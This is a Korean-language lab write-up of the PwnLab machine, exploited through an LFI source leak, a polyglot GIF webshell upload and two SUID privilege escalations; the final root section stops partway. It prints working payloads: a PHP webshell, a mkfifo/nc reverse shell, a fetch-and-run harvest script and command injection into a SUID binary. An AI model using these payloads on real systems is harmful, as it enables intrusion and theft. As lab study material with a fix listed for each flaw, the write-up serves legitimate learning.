---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/web/file-upload
  - tech/db/mysql
  - tech/cred/reuse
  - tech/lin/suid
  - tech/lin/path-hijack
  - tech/lin/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.29
ports: [80, 111, 3306, 50118]
services: [http, mysql, rpcbind, status]
status: solved
manual_tags: true
tech_count: 8
---

> [!info] 요약
> 타겟 `192.168.248.29` · Debian 8 jessie(32비트) · Fundamental · 플래그 2개
> 진입점: `?page=php://filter/...resource=config` 로 소스 유출 → MySQL 평문(base64) 자격증명 덤프 → 앱 로그인 → GIF 폴리글롯 업로드 → `Cookie: lang=../upload/*.gif` 로 두 번째 include() 실행 → www-data RCE
> 권한상승: DB 비밀번호 재사용(`su`)으로 kane → SUID `msgmike` PATH 하이재킹으로 mike → SUID `msg2root` 커맨드 인젝션으로 root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.29

### Initial Access – 확장자 강제 LFI 로 유출한 DB 크리덴셜을 GIF 폴리글롯 업로드와 두 번째 무방비 include() 로 체인해 RCE 획득

**Vulnerability Explanation:** 네 취약점이 순차로 체인됨.
- `index.php?page=` 는 `include($_GET['page'].".php")` 로 `.php` 가 강제 추가돼 임의 파일 실행은 막히지만, `php://filter/convert.base64-encode/resource=config` 로 **소스 코드 유출**은 그대로 가능 — `config.php` 에서 MySQL `root:H4u%QJ_H99` 평문 노출
- MySQL 3306 이 인터넷에 직접 노출돼 Kali 에서 바로 접속 가능. `users` 테이블 비밀번호가 해시가 아니라 **base64 인코딩**(가역)으로 저장돼 즉시 평문 복원
- 업로드 검사가 파일명 확장자·클라이언트 `Content-Type`·`getimagesize()` 매직바이트 세 겹이지만 **셋 다 서로 다른 곳을 봄** — GIF 헤더 뒤에 PHP 태그를 붙인 폴리글롯 파일로 전부 통과
- `index.php` 상단의 `include("lang/".$_COOKIE['lang'])` 는 `.php` 강제가 **없음** — 업로드한 파일을 `../upload/<md5>.gif` 경로로 include 시켜 임의 코드 실행

**Vulnerability Fix:**
- `include()` 에 사용자 입력을 직접 연결 금지. 화이트리스트 배열 매핑이나 최소한 `realpath`+prefix 검사
- 비밀번호를 base64 가 아닌 `password_hash()`(bcrypt)로 저장, DB 계정과 OS 계정 비밀번호 공유 금지
- MySQL 을 `127.0.0.1` 에만 바인딩(외부 인터페이스 노출 금지)
- 업로드 파일을 웹 서버가 직접 읽는 경로 밖에 저장하고, 확장자·MIME 검사는 보조 수단으로만 취급

**Severity:** Critical — 무인증 상태에서 정보유출·자격증명탈취·업로드 우회가 체인돼 즉시 원격 코드 실행으로 이어짐

**Steps to reproduce the attack:**
1. `?page=php://filter/convert.base64-encode/resource=config` 로 `config.php` 소스 획득 → MySQL `root:H4u%QJ_H99`
2. Kali 에서 3306 직접 접속, `Users.users` 테이블 덤프 → base64 비밀번호 3개 디코딩
3. 디코딩한 비밀번호로 `login.php` 폼 로그인 성공
4. GIF89a 매직바이트 + `<?php system($_REQUEST["c"]); ?>` 를 붙인 `sh.gif` 를 업로드(파일명 `.gif`, `Content-Type: image/gif`)
5. `Cookie: lang=../upload/<md5(파일명)>.gif` 로 `index.php` 요청 → 업로드 파일이 include 되어 명령 실행(www-data)
6. `mkfifo` 리버스셸로 대화형 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.29 | TCP: 80, 111, 3306, 50118 |

전체 포트 스캔 호출 — tmux pane 을 `capture-pane` 으로 뜬 것이라 프롬프트와 pty 폭(80열)에서 잘린 줄바꿈이 그대로 들어 있음:

```text
┌──(kali㉿kali)-[~/PG/PwnLab]
└─$ cd ~/PG/PwnLab && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.
248.29 2>&1 | tee nmap.full.txt
```
— 출처: `~/PG/PwnLab/try2_nnmap_alias_notfound.log`

```text
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33696/udp6  status
|   100024  1          41404/tcp6  status
|   100024  1          45351/udp   status
|_  100024  1          50118/tcp   status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 42
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsTransactions, LongColumnFlag, Speaks41ProtocolOld, SupportsCompression, LongPassword, FoundRows, IgnoreSigpipes, Speaks41ProtocolNew, ODBCClient, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ]l(#q5Rz3-(}aK7pP|An
|_  Auth Plugin Name: mysql_native_password
50118/tcp open  status  1 (RPC #100024)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 4 hops
```
— 출처: `~/PG/PwnLab/nmap.log`(`nmap -sCV -p- -Pn -A --min-rate 5000`)

UDP top-50 은 111/udp(rpcbind) 하나뿐 — 출처: `~/PG/PwnLab/nmap.udp.log`.

50118/tcp 의 실체는 셸 획득 후 `ss -lntup` 으로 특정됨 — `rpc.statd`(pid 435)가 잡고 있는 **실제 리스닝 서비스**:

```text
tcp    LISTEN     0      128                    *:50118                 *:*      users:(("rpc.statd",pid=435,fd=9))
```
— 출처: `~/PG/PwnLab/harvest_root.txt` `===== LISTEN =====` 절

`rpc.statd` 는 `-p` 없이 뜨면 부팅마다 포트를 새로 배정받으므로 다음 인스턴스에서 같은 번호일 보장은 없음 `[가정]` — 재부팅 간 대조는 관측 없음. 그럼에도 색인 `ports:` 에는 남김(리눅스 노트에서는 고포트 자동 제외가 적용되지 않고, 여기서는 프로세스까지 특정됨).

111/50118 은 rpcbind + rpc.statd 뿐이고 NFS(2049)는 TCP·UDP 양쪽 다 닫혀 있으며 `/etc/exports` 도 비어 있었음 — `mount.nfs` 가 SUID 로 있어 잠깐 눈길이 갔지만 export 가 없어 경로가 아님.

버전 판정 독립 근거 2개 — nmap 배너(`Apache httpd 2.4.10 (Debian)`) + 침투 후 확인한 인터프리터 버전:

```text
PHP 5.6.17-0+deb8u1 (cli) (built: Jan 15 2016 15:55:17)
Copyright (c) 1997-2015 The PHP Group
allow_url_fopen => On => On
allow_url_include => Off => Off
```
— 출처: `~/PG/PwnLab/proof_root.txt`(root 셸에서 `php -v` · `php -i` 실행분)

`OS details: Linux 3.10 - 4.11` + 침투 후 `uname -a` 로 확정: `Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux`(32비트).

![[PG-PwnLab-home.png]]

`[ Home ] [ Login ] [ Upload ]` 세 링크가 각각 `?page=login`·`?page=upload`. `?page=<이름>` 이 파일명을 그대로 받는 구조로 보여 디렉터리 브루트포싱 없이 이 파라미터부터 팜.

![[PG-PwnLab-login.png]]

업로드 페이지는 로그인 전 `You must be log in.` 만 반환.

![[PG-PwnLab-upload-denied.png]]

### Initial Access – LFI 소스 유출 → DB 크리덴셜 재사용 → GIF 업로드 → 두 번째 LFI 로 RCE

`php://filter` 래퍼로 소스를 base64 로 받는다. 리소스 이름에 `.php` 를 **안 붙인 것이 요점** — `index.php` 가 include 직전에 `.php` 를 붙이므로 `resource=config` 라고 써야 최종적으로 `config.php` 가 include 됨.

```bash
curl -s 'http://192.168.248.29/index.php?page=php://filter/convert.base64-encode/resource=config'
```

`index.php` 소스 전문(디코딩):

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```
— 출처: `~/PG/PwnLab/src_index.php`

여기서 두 가지가 동시에 보인다.

1. `include($_GET['page'].".php")` — `.php` 가 강제로 붙음. `?page=/tmp/x.gif` 는 `/tmp/x.gif.php` 를 찾으므로 실패. 널바이트로 자르는 것은 PHP 5.6 에서 불가(이 박스는 PHP 5.6.17). **이 진입점은 소스 읽기 전용.**
2. `include("lang/".$_COOKIE['lang'])` — **확장자가 안 붙음.** 주석은 "Not implemented yet" 이지만 include 는 실제로 실행됨. **여기가 진짜 실행 경로.**

`config.php`:

```php
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```
— 출처: `~/PG/PwnLab/src_config.php`

`login.php` 는 prepared statement 를 제대로 씀 — SQLi 는 없음:

```php
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);

	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
	$stmt->bind_param('ss', $luser, $lpass);
```
— 출처: `~/PG/PwnLab/src_login.php`

대신 비밀번호를 base64 로 "저장" — 해시가 아니라 인코딩이므로 DB 를 읽으면 평문이 그대로 나옴.

> [!tip] RFI 는 왜 안 되는가 — 실제로 때려봤다
> `?page=http://192.168.45.207:8000/rfitest` 를 던졌으나 include 자리에 아무것도 안 나왔고, Kali HTTP 서버 로그에 요청 자체가 안 찍혔음(출처: `~/PG/PwnLab/try5_rfi_blocked.log` — 캡처된 것은 게이트를 통과한 뒤 되돌아온 `index.php` 정적 부분뿐).
> 타겟에서 확인한 값도 일치: `allow_url_fopen => On`, `allow_url_include => Off`(위 버전 근거 블록). `allow_url_fopen` 이 On 이라 `file_get_contents` 는 URL 을 읽지만 `include` 는 별도 스위치가 막음. 파일을 먼저 올려야 하는 이유.

3306 이 외부에 열려 있으므로 Kali 에서 바로 붙는다.

```bash
mysql --skip-ssl -h 192.168.248.29 -u root -p'H4u%QJ_H99' -e 'show databases; use Users; show tables; select * from users;'
```
```text
Database
information_schema
Users
Tables_in_Users
users
user	pass
kent	Sld6WHVCSkpOeQ==
mike	U0lmZHNURW42SQ==
kane	aVN2NVltMkdSbw==
```
— 출처: `~/PG/PwnLab/mysql_dump.txt`

`--skip-ssl` 이 필요한 이유는 시행착오로 밝혀졌다 — [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] 참고. Kali 의 MariaDB 클라이언트(11.8.3-MariaDB, client 15.2)가 기본으로 TLS 를 요구하는데 MySQL 5.5 는 그걸 못 한다.

```text
Sld6WHVCSkpOeQ== -> JWzXuBJJNy
U0lmZHNURW42SQ== -> SIfdsTEn6I
aVN2NVltMkdSbw== -> iSv5Ym2GRo
```
— 출처: `~/PG/PwnLab/creds.txt`

GIF89a 매직바이트 + PHP 웹셸을 붙인 폴리글롯을 만든다.

```bash
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff' > sh.gif
echo '<?php system($_REQUEST["c"]); ?>' >> sh.gif
```
```text
00000000: 4749 4638 3961 0100 0100 8000 0000 0000  GIF89a..........
00000010: ffff ff3c 3f70 6870 2073 7973 7465 6d28  ...<?php system(
00000020: 245f 5245 5155 4553 545b 2263 225d 293b  $_REQUEST["c"]);
00000030: 203f 3e0a                                 ?>.
```
— 출처: `~/PG/PwnLab/sh.gif`(52바이트 전량)

`GIF89a` 뒤 바이트는 논리 화면 기술자(가로 1·세로 1·색상정보)다. `getimagesize()` 가 크기를 읽어야 하므로 `GIF89a;` 만 붙이는 것보다 안전하다.

`upload.php` 의 검사는 네 겹인데 **서로 다른 곳을 보므로** 따로 만족시키면 됨.

| 검사 | 보는 것 | 실패 시 | 우회 |
|---|---|---|---|
| `strrchr($filename,'.')` 가 `array(".jpg",".jpeg",".gif",".png")` 에 있는가 | 파일명의 마지막 점 이후(점 포함) | `Not allowed extension...` | 파일명을 `sh.gif` 로 |
| `strpos($filetype,'image') !== false` | 클라이언트가 보낸 `Content-Type` | `Error 001` | 우리가 정하는 값이라 `image/gif` |
| `getimagesize()['mime']` 가 gif/jpeg/jpg/png 인가 | 파일 내용의 매직바이트 | `Error 002` | GIF 헤더를 앞에 붙임 |
| `substr_count($filetype,'/') > 1` | `Content-Type` 의 슬래시 개수 | `Error 003` | `image/gif` 는 슬래시 1개라 그대로 통과 |
— 출처: `~/PG/PwnLab/src_upload.php`

저장 경로는 `$uploaddir . md5(basename($_FILES['file']['name'])) . $file_ext` — **원본 파일명의 md5 + 원래 확장자**라 업로드 전에 이름을 계산할 수 있음.

로그인 → 업로드:

```bash
curl -s -c cookies.txt -d 'user=kent&pass=JWzXuBJJNy&submit=Login' 'http://192.168.248.29/index.php?page=login' -i
```
```text
HTTP/1.1 302 Found
Date: Thu, 20 Aug 2026 08:38:44 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=8a228r4sf2muih5e37huv72r16; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: ?page=upload
Content-Length: 265
Content-Type: text/html; charset=UTF-8
```
— 응답 헤더 자체는 파일로 저장하지 않았고 세션 쿠키만 `~/PG/PwnLab/cookies.txt` 에 남음(값 `PHPSESSID=8a228r4sf2muih5e37huv72r16` 일치). 헤더의 `Date: 08:38:44 GMT`(=17:38:44 KST)가 그 파일의 mtime `17:38:43` 과 1초 안에서 맞음.

302 + `Location: ?page=upload` 가 로그인 성공 신호. 실패 시 200 에 `Login failed.`

```bash
curl -s -b cookies.txt -F 'file=@sh.gif;type=image/gif' -F 'submit=Upload' 'http://192.168.248.29/index.php?page=upload'
```
```html
<img src="upload/63f0276ffd69eb424bf6093795ac9850.gif"><br />
```
— 출처: `~/PG/PwnLab/upload_resp.html`. 저장 이름은 `md5(basename(원래이름))+확장자` 라 예측 가능.

`;type=` 이 없어도 curl 은 `.gif` 확장자를 보고 자동으로 `Content-Type: image/gif` 를 채움. Kali 로컬 nc 리스너로 확인한 결과(바깥이 multipart 전체, 안쪽이 파트별):

```text
Content-Type: multipart/form-data; boundary=------------------------wA4WtwC7FPzt6Po9FnsShJ
Content-Type: image/gif
```

즉 이 박스에서는 `;type=` 이 없어도 통과했을 것. 다만 확장자를 `.php` 로 두고 Content-Type 만 속이는 상황에서는 명시가 필수라 습관으로 붙임.

`../upload/<md5>.gif` 로 두 번째 include 를 실행한다. `../` 는 include 가 `lang/` 을 앞에 붙이기 때문에 필요 — `lang/../upload/...` 로 웹루트로 되돌아옴.

```bash
curl -s -i -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' --get --data-urlencode 'c=id; uname -a; ls -la /home' 'http://192.168.248.29/'
```
```text
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 08:39:05 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 785
Content-Type: text/html; charset=UTF-8

GIF89a^A^@^A^@M-^@^@^@^@^@^@M-^?M-^?M-^?uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
total 24
drwxr-xr-x  6 root root 4096 Mar 17  2016 .
drwxr-xr-x 21 root root 4096 Feb 20  2020 ..
drwxr-x---  2 john john 4096 Mar  3  2020 john
drwxr-x---  2 kane kane 4096 Jul 22  2020 kane
drwxr-x---  2 kent kent 4096 Mar  3  2020 kent
drwxr-x---  2 mike mike 4096 Mar  3  2020 mike
<html>^M
```
— **이 curl 응답은 파일로 저장하지 않았음.** 위 블록은 실행 당시 터미널에서 옮겨 적은 것이고, 뒷받침 근거 셋: ① `uid=33(www-data)`·`uname` 문자열과 `/home` 목록(`total 24` 이하 6줄)이 `~/PG/PwnLab/harvest_www-data.txt` 의 `-- homes --` 절과 한 글자도 다르지 않음 ② 헤더의 `Date: 08:39:05 GMT` 가 그 harvest 파일이 기록한 `Thu Aug 20 08:40:34 UTC 2026` 보다 89초 앞섬(작업 순서와 일치) ③ 리버스셸 로그가 같은 www-data 로 붙음.

응답 맨 앞의 `GIF89a` 매직바이트가 그대로 찍힌 것이 심은 파일이 실행됐다는 증거. 뒤의 `<html>^M` 은 include 가 끝나고 `index.php` 본문이 이어진 부분.

웹셸로 읽은 플래그는 OSCP 에서 0점이므로 바로 대화형 셸로 전환. 리스너는 tmux 안에 둔다.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s pwnlab_shell 'rlwrap nc -lvnp 443 2>&1 | tee ~/PG/PwnLab/shell_www-data.log; exec bash'"
curl -s -m 10 -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' \
  --get --data-urlencode 'c=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.207 443 >/tmp/f' \
  'http://192.168.248.29/'
```

아래는 리스너가 받은 스트림 원문(`rlwrap nc -lvnp 443 | tee ~/PG/PwnLab/shell_www-data.log`). 타겟 pty 프롬프트가 그대로 들어 있음 — 이후 인용하는 `*@pwnlab:*` 블록은 전부 이 파일에서 옴:

```text
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.29] 43985
/bin/sh: 0: can't access tty; job control turned off
$ www-data@pwnlab:/var/www/html$ cd /tmp && wget -q http://192.168.45.207:8000/harvest.sh -O /tmp/h.sh && echo GOT && sh /tmp/h.sh; echo DONE
GOT
수집 완료: /tmp/.h/harvest.txt
889 /tmp/.h/harvest.txt
DONE
```

443 아웃바운드가 첫 시도에 통과했다(`-m 10` 은 curl 이 무한 대기하지 않게 하는 안전장치). 22 포트가 없어 SSH 로 갈아탈 수 없고, 이후 계정 전환은 전부 `su` 로 한다.

**Local.txt value:**
`e7fb032dc3da97822fc7dc2d65ffcc18`

유보 — www-data RCE 만으로는 이 값을 읽을 수 없음. `/home/kane/local.txt` 가 `drwxr-x---` 안에 있어, DB 비밀번호 재사용으로 kane 계정까지 승격한 뒤에야 확인됨(Privilege Escalation 1단계). 표준 위치를 지키기 위해 값만 여기 제시함.

### Privilege Escalation – MySQL 자격증명의 OS 계정 재사용 (www-data → kane)

**Vulnerability Explanation:** MySQL `users` 테이블에서 base64 로 복원한 비밀번호가 `su` 로 로컬 계정 인증에도 그대로 통함. 앱 계정과 OS 계정이 같은 값을 공유함.

**Vulnerability Fix:** 애플리케이션 계정과 OS 계정의 비밀번호를 절대 공유하지 않는다. 공유가 불가피하면 최소한 애플리케이션 쪽을 단방향 해시로 저장해 값 복원 자체를 막는다.

**Severity:** Medium — 코드 실행은 이미 확보된 상태에서 자격증명 재사용으로 명명된 로컬 계정(kane)을 획득. user 플래그 도달

**Steps to reproduce the attack:**
1. 앞서 디코딩한 비밀번호 3개(`JWzXuBJJNy`·`SIfdsTEn6I`·`iSv5Ym2GRo`)를 `su` 로 순서대로 시도
2. `su kent` 통과하나 홈이 완전히 비어 막다른 길
3. `su kane` 통과 → `local.txt` 및 SUID `msgmike` 확인

`su` 는 TTY 를 요구하므로 리버스셸에 pty 를 먼저 올려야 한다(이 셸은 `www-data@pwnlab:...$` 프롬프트가 이미 붙어 있어 pty 가 있는 상태 — `can't access tty` 로 시작한 원시 `/bin/sh` 세션에서 `python -c "import pty;pty.spawn('/bin/bash')"` 를 보내 전환한 것으로 추정되나, `sh` 가 입력을 에코하지 않아 그 명령 자체는 캡처에 안 남고 프롬프트 변화만 남았음).

```text
www-data@pwnlab:/tmp$ su kent
Password: 
kent@pwnlab:/tmp$ id; ls -la ~
uid=1001(kent) gid=1001(kent) groups=1001(kent)
total 20
drwxr-x--- 2 kent kent 4096 Mar  3  2020 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw------- 1 kent kent    0 Mar  3  2020 .bash_history
-rw-r--r-- 1 kent kent  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kent kent 3515 Mar 17  2016 .bashrc
-rw-r--r-- 1 kent kent  675 Mar 17  2016 .profile
```
— 출처: `~/PG/PwnLab/shell_www-data.log`. `su` 는 비밀번호를 에코하지 않아 `Password:` 뒤가 비어 있음(넣은 값은 `JWzXuBJJNy`). kent 홈은 dotfile 뿐 — 막다른 길.

```text
kent@pwnlab:/tmp$ su kane
Password: 
kane@pwnlab:/tmp$ id; ls -la /home/kane /home/mike /home/john 2>&1
uid=1003(kane) gid=1003(kane) groups=1003(kane)
ls: cannot open directory /home/john: Permission denied
/home/kane:
total 32
drwxr-x--- 2 kane kane 4096 Jul 22  2020 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw------- 1 kane kane    0 Mar  3  2020 .bash_history
-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc
-rw-r--r-- 1 kane kane   33 Aug 20 04:23 local.txt
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
ls: cannot open directory /home/mike: Permission denied
```
— 출처: `~/PG/PwnLab/shell_www-data.log`(`iSv5Ym2GRo`로 진입). `2>&1` 을 안 붙이면 `ls` 의 `Permission denied` 가 stderr 로 사라져 "mike 홈이 비었다"로 잘못 읽기 쉽다 — 여기서는 그 줄이 "아직 mike 가 아니다"라는 정보다.

`local.txt` 와 SUID `msgmike`(소유자 mike)가 같이 나온다. mike 의 DB 비밀번호(`SIfdsTEn6I`)는 OS 계정에서는 안 통했고, 대신 이 바이너리가 mike 로 가는 통로다.

### Privilege Escalation – SUID msgmike 상대경로 PATH 하이재킹 (kane → mike)

**Vulnerability Explanation:** SUID(mike 소유) 바이너리 `msgmike` 가 `cat` 을 절대경로 없이 `system()` 으로 호출. 호출자의 PATH 를 그대로 신뢰하므로 앞쪽에 가짜 `cat` 을 심으면 mike 권한으로 임의 코드가 실행됨.

**Vulnerability Fix:** SUID 바이너리에서 외부 명령 호출 시 절대경로를 쓴다(`/bin/cat`). 불가피하면 `execve` 로 넘기기 전 PATH·IFS 등 환경변수를 초기화한다.

**Severity:** High — 저권한 계정에서 다른 계정(mike) 권한으로 완전한 코드 실행 획득

**Steps to reproduce the attack:**
1. `strings msgmike` 로 상대경로 `cat` 호출 확인
2. `/tmp/.pth/cat` 에 `exec /bin/bash -p` 를 심은 가짜 `cat` 작성 후 실행권한 부여
3. `PATH=/tmp/.pth:$PATH /home/kane/msgmike` 로 실행 → mike 프롬프트로 전환

```text
kane@pwnlab:/tmp$ strings /home/kane/msgmike; echo ===; ./ /home/kane/msgmike 2>/dev/null; /home/kane/msgmike
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setregid
setreuid
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh 
QVh[
[^_]
cat /home/mike/msg.txt
(…이하 섹션명·crtstuff 심볼 생략…)
===
cat: /home/mike/msg.txt: No such file or directory
kane@pwnlab:/tmp$ strings /home/kane/msgmike | grep -i cat
cat /home/mike/msg.txt
```
— 출처: `~/PG/PwnLab/shell_www-data.log`(같은 구간이 `~/PG/PwnLab/try1_msgmike_histexpand.log` 에 프롬프트 없이 발췌돼 있음). `./ /home/kane/msgmike` 는 오타이고 `2>/dev/null` 로 죽어 아무것도 안 남았음 — 뒤에 붙인 두 번째 호출이 실제 실행분. `system` 과 `setreuid` 가 심볼에 함께 있고, 호출 문자열은 `cat /home/mike/msg.txt` — 절대경로가 아님.

가짜 `cat` 작성 중 큰따옴표 안의 `#!` 가 bash 히스토리 확장에 먹혀(`bash: !/bin/bash\nexec: event not found`) 줄 전체가 폐기됨. 히스토리 확장은 **줄을 읽는 시점**에 일어나므로 같은 줄 앞의 `set +H` 는 이미 늦음 — **별도 줄로 먼저** 보내 해결.

```text
kane@pwnlab:/tmp$ set +H
kane@pwnlab:/tmp$ mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; /bin/cat /tmp/.pth/cat
#!/bin/bash
exec /bin/bash -p
kane@pwnlab:/tmp$ PATH=/tmp/.pth:$PATH /home/kane/msgmike
mike@pwnlab:/tmp$ id; ls -la /home/mike
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
total 28
drwxr-x--- 2 mike mike 4096 Mar  3  2020 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw-r--r-- 1 root root    0 Mar  3  2020 .bash_history
-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root
-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile
```
— 출처: `~/PG/PwnLab/shell_www-data.log`. 프롬프트가 `kane@` 에서 `mike@` 로 바뀐 것이 성공 신호. 방금 `Permission denied` 였던 `/home/mike` 가 바로 열리며 SUID root `msg2root` 가 드러난다.

`id` 가 `uid=1002` 로 나온다 — euid 뿐 아니라 **real uid 까지** 바뀜. `msgmike` 가 `setreuid` 를 먼저 호출하기 때문이며, 덕분에 bash 가 권한을 떨어뜨리지 않는다. **다만 이 real-uid 전환은 이 바이너리에 한정된 관측**이고, 일반적인 SUID 셸(dash 경유)에서는 euid 만 바뀌고 real uid 는 유지돼 권한이 소실될 수 있다(`msg2root` finding 및 [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]] 참고).

### Privilege Escalation – SUID msg2root 무필터 커맨드 인젝션 (mike → root)

**Vulnerability Explanation:** SUID(root 소유) 바이너리 `msg2root` 가 `fgets` 로 stdin 을 받아 `asprintf` 로 `/bin/echo %s >> /root/messages.txt` 포맷에 그대로 끼워 `system()` 실행. 입력에 세미콜론을 넣으면 뒤 문장이 root 권한 셸에서 그대로 실행됨. `/bin/echo` 자체는 절대경로라 PATH 하이재킹은 안 통하지만, 필터 없는 문자열 삽입이 더 직접적인 구멍이다.

**Vulnerability Fix:** 사용자 입력을 셸 명령 문자열에 직접 끼워 넣지 않는다. `execve` 로 인자 배열을 넘기거나, 최소한 세미콜론·파이프·백틱 등 셸 메타문자를 거부한다.

**Severity:** Critical — 무필터 커맨드 인젝션으로 즉시 root 셸 획득

**Steps to reproduce the attack:**
1. `strings msg2root` 로 `fgets`·`asprintf`·`system`·포맷 문자열(`/bin/echo %s >> /root/messages.txt`) 확인
2. `msg2root` 실행 후 프롬프트에 `hi; /bin/bash -p` 입력 → euid=0 셸 획득
3. `os.setresuid(0,0,0)` 으로 real uid 까지 완전한 root 로 전환

```text
mike@pwnlab:/tmp$ strings /home/mike/msg2root | head -30
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
stdin
fgets
asprintf
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Message for root: 
/bin/echo %s >> /root/messages.txt
(…이하 GCC 배너·섹션명 생략…)
mike@pwnlab:/tmp$ /home/mike/msg2root
Message for root: hi; /bin/bash -p
hi
bash-4.3# id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
```
— 출처: `~/PG/PwnLab/shell_www-data.log`(같은 구간이 `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log` 에도 있음). `hi` 가 먼저 출력되는 것은 `/bin/echo hi` 가 정상 실행됐다는 신호. **`-p` 는 필수** — 이 바이너리는 `setreuid` 를 호출하지 않아 real uid 가 mike 로 남고, `-p` 없는 bash 는 euid 를 real uid 로 되돌림.

`-p` 의 이 동작은 **이 박스에서 관측한 것이 아님.** Kali 에서 SUID root C 프로그램 두 개(`execl("/bin/bash","bash","-c","id -u; id -u -r")` 와 같은 코드에 `-p` 만 추가한 것)를 `/home` 아래에 두고 직접 실행해 확인함:

```text
--- a (no -p) ---
1000
1000
--- b (with -p) ---
0
1000
```

`id -u`(euid) / `id -u -r`(real uid) 순서다. `-p` 가 없으면 euid 가 real uid 로 되돌려지고, 주면 euid=0 이 유지되며 real uid 만 1000 으로 남음.

곁다리 — 이 테스트를 `/tmp` 에서 하면 `-p` 를 줘도 euid 가 안 오름. Kali `/tmp` 가 `nosuid` 마운트이기 때문(`findmnt -no OPTIONS /tmp` → `rw,nosuid,nodev,size=12463400k,nr_inodes=1048576,inode64`). **SUID 실험은 `/tmp` 에서 하지 말 것.** Kali 쪽 검증용 바이너리는 실행 직후 삭제함.

euid 만 root 인 상태는 `su`·파일 소유 등에서 불편하므로 완전한 root 로 전환한다.

```text
bash-4.3# python -c "import os;os.setresuid(0,0,0);os.setresgid(0,0,0);os.execl(\"/bin/bash\",\"bash\")"
root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; ls -la /root; cat /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:30 EDT 2026
total 24
drwx------  2 root root 4096 Aug 20 04:23 .
drwxr-xr-x 21 root root 4096 Feb 20  2020 ..
